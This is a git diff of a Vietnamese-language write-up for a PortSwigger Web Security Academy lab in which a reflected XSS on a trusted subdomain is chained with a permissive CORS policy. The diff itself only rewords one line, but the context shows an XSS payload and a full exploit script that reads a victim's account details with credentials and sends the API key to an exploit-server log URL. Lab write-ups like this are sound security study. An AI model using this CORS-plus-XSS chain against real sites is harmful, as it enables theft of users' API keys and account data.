@@ -114,7 +114,7 @@ image:
     - Vào 1 post bất kỳ
     - Checkstock => xuất hiện 1 subdomain
     - Thử khai thác XSS và thành công với payload: `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=%3Cimg%20src=1%20onerror=alert()%3E&storeId=acb`
-- Thử thay giá trị **header Origin** thành `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net` và thành công => Server chấp nhận 
+- Thử thay giá trị **header Origin** thành `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net` và thành công => origin được server tin cậy
 
 #### Exploit
 - Ý tưởng: Từ lỗi XSS ở subdomain, tạo script đế tấn công lấy **apikey**
@@ -123,7 +123,6 @@ image:
 <script>
     document.location="http://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {location='https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
 </script>
-
 ```
 - Deliver to victim
 - Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit
